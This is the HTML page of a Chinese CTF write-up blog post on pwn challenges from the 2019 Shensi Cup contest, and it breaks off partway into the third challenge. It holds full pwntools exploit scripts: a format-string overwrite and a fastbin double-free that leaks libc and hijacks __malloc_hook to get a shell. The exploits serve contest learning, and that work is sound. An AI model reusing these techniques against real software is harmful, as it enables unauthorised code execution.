@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>2019-深思杯 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="把之前比赛的题目做做当时放弃拯救的我，把所有能保存的题目都保存了下来深思杯 2019 山东省大学生网络安全技能大赛.zip MinZhu首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以找出来 key 是 xNd9y6 然后看一下位置，第四个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-深思杯">
+<meta property="og:url" content="https://yichen115.github.io/2020/06/23/ygucy4/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="把之前比赛的题目做做当时放弃拯救的我，把所有能保存的题目都保存了下来深思杯 2019 山东省大学生网络安全技能大赛.zip MinZhu首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以找出来 key 是 xNd9y6 然后看一下位置，第四个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007357895-cafc3074-54db-49de-9140-0513a990cd34.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=833&size=41731&status=done&style=none&width=490">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007402886-ae2d5924-b2f4-4bf7-a3cb-6129edcaf182.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1153&size=267900&status=done&style=none&width=617">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602676440419-79e97195-7d5a-46d9-893d-86a15a4d72aa.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=778&size=44815&status=done&style=none&width=633">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602762174648-693a8a47-f58c-43ab-953d-9b58b7b41760.png#align=left&display=inline&height=403&margin=%5Bobject%20Object%5D&name=image.png&originHeight=709&originWidth=1311&size=272349&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602764804761-6fe8af4f-f5e6-43b0-8a24-a37729222b45.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&name=image.png&originHeight=179&originWidth=647&size=8895&status=done&style=stroke&width=415">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602834711339-5e5a29b0-a457-4c63-96ba-5ac82b4d4232.png#align=left&display=inline&height=386&margin=%5Bobject%20Object%5D&name=image.png&originHeight=605&originWidth=790&size=116804&status=done&style=none&width=504">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602985542994-67dd5e86-2e61-4dd6-91b9-9572b61d4d6d.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=image.png&originHeight=505&originWidth=635&size=39820&status=done&style=none&width=420">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074352821-640b97e0-d0e1-419b-855c-83d8500c8a91.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=898&size=146494&status=done&style=none&width=621">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074440243-c9263169-fd14-4041-a807-1daea39f1256.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=895&size=139899&status=done&style=none&width=643">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074566279-0406d3a2-8cc5-4c93-a19d-10ff3723d2ed.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=896&size=182083&status=done&style=none&width=613">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074686178-31e0b7f2-6d0d-40aa-b379-d992812ac761.png#align=left&display=inline&height=359&margin=%5Bobject%20Object%5D&name=image.png&originHeight=521&originWidth=899&size=153285&status=done&style=none&width=619">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603075003247-4d29e4a1-4e14-47d3-870a-c665d6a7cb80.png#align=left&display=inline&height=449&margin=%5Bobject%20Object%5D&name=image.png&originHeight=665&originWidth=901&size=181333&status=done&style=none&width=608">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1603076030616-55124438-71b0-44c5-bdb1-dd47f458b30a.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=427&size=42375&status=done&style=none&width=329">
+<meta property="article:published_time" content="2020-06-23T05:33:32.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.634Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">2019-深思杯</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">2019-深思杯</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-06-23T05:33:32.000Z" itemprop="datePublished" class="page-time">
+  2020-06-23
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MinZhu"><span class="post-toc-number">1.</span> <span class="post-toc-text">MinZhu</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#heap-doublefree-x64"><span class="post-toc-number">2.</span> <span class="post-toc-text">heap_doublefree_x64</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#secnote"><span class="post-toc-number">3.</span> <span class="post-toc-text">secnote</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ygucy4"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">2019-深思杯</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-06-23 13:33:32" datetime="2020-06-23T05:33:32.000Z"  itemprop="datePublished">2020-06-23</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>把之前比赛的题目做做</strong><br>当时放弃拯救的我，把所有能保存的题目都保存了下来<br><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/268938/1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip?_lake_card=%7B%22uid%22%3A%221593043441814-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F268938%2F1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip%22%2C%22name%22%3A%22%E6%B7%B1%E6%80%9D%E6%9D%AF2019%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B.zip%22%2C%22size%22%3A66903512%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22Szkj0%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">深思杯 2019 山东省大学生网络安全技能大赛.zip</a></p>
+<h1 id="MinZhu"><a href="#MinZhu" class="headerlink" title="MinZhu"></a>MinZhu</h1><p>首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以<br>找出来 key 是 xNd9y6</p>
+<p>然后看一下位置，第四个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后， 程序有一个后门，覆盖后面要执行的一个函数的地址为它就能打印出 flag 了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007357895-cafc3074-54db-49de-9140-0513a990cd34.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=833&size=41731&status=done&style=none&width=490" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Key:"</span>)</span><br><span class="line">p.sendline(<span class="string">"xNd9y6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line">print(len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007402886-ae2d5924-b2f4-4bf7-a3cb-6129edcaf182.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1153&size=267900&status=done&style=none&width=617" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="heap-doublefree-x64"><a href="#heap-doublefree-x64" class="headerlink" title="heap_doublefree_x64"></a>heap_doublefree_x64</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"length of data:\n"</span>,str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Leave your message:\n"</span>)</span><br><span class="line">  p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"want to delete:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(index,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"4"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"want to modify:\n"</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">"to modify:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">(suggest)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"5"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"your advice:\n"</span>,suggest)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"1111"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"4444"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"5555"</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"2333"</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))<span class="comment">#10</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"\x20"</span>)<span class="comment">#11</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Total:11,Index-&gt;11\nSticky note:"</span>)</span><br><span class="line">unsortedbin = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = unsortedbin <span class="number">-0x100</span> - <span class="number">0x3c4b20</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">malloc_addr = malloc_hook - <span class="number">0x30</span> + <span class="number">0xd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1212"</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1313"</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1414"</span>)<span class="comment">#14</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line">add(<span class="number">0x60</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input the length of data:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"21"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>申请堆块的时候会在 0x06020C8（bss 段）维护一个表<br>分别是第几个申请的、大小、指针、1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602676440419-79e97195-7d5a-46d9-893d-86a15a4d72aa.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=778&size=44815&status=done&style=none&width=633" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>不过没用上这里</p>
+<p>free 的时候只是把存放的堆指针的地方给置为 0 了，没有把 chunk 给置为 0<br>fastbin double free 的时候是这么一个指针</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602762174648-693a8a47-f58c-43ab-953d-9b58b7b41760.png#align=left&display=inline&height=403&margin=%5Bobject%20Object%5D&name=image.png&originHeight=709&originWidth=1311&size=272349&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602764804761-6fe8af4f-f5e6-43b0-8a24-a37729222b45.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&name=image.png&originHeight=179&originWidth=647&size=8895&status=done&style=stroke&width=415" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以把 fd 指针的最后一位改成 \x50，这样再去 malloc 的时候就能申请到 0x603050</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">"1111"</span>)</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))<span class="comment">#要注意0x603050那里的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"3333"</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"4444"</span>)<span class="comment">#这俩0x60是为了确保有后面0x110大小的空间</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"5555"</span>)<span class="comment">#0x70+0x70+0x30=0x110</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"2333"</span>)<span class="comment">#这个是防止0x110与top chunk合并的</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"\x50"</span>)</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br></pre></td></tr></table></figure>
+
+<p>然后 free 掉，再 malloc 回来去 show 就能显示出来，然而我们会改掉后面那一位，不过不要紧，后三位基本都是 0x00 的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"\x20"</span>)<span class="comment">#11</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Total:11,Index-&gt;11\nSticky note:"</span>)</span><br><span class="line">unsortedbin = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = unsortedbin <span class="number">-0x100</span> - <span class="number">0x3c4b20</span><span class="comment">#这个使用main_arena算出来的</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就能计算出 malloc_hook 与 one_gadget 的地址了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">malloc_addr = malloc_hook - <span class="number">0x30</span> + <span class="number">0xd</span></span><br></pre></td></tr></table></figure>
+
+<p>在我电脑上 one_gadget 中的 0xf1207 可以用<br>这个 malloc_addr 是算了个偏移,为了后面申请到 malloc_hook 的时候能有个 size 位绕过检查<br>然后还是上面的套路，fastbin double free 把 malloc_hook 的地址改为 one_gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">"1212"</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1313"</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"1414"</span>)<span class="comment">#14</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_addr))</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line">add(<span class="number">0x60</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>然后去申请的时候就能拿到 shell 了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602834711339-5e5a29b0-a457-4c63-96ba-5ac82b4d4232.png#align=left&display=inline&height=386&margin=%5Bobject%20Object%5D&name=image.png&originHeight=605&originWidth=790&size=116804&status=done&style=none&width=504" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="secnote"><a href="#secnote" class="headerlink" title="secnote"></a>secnote</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 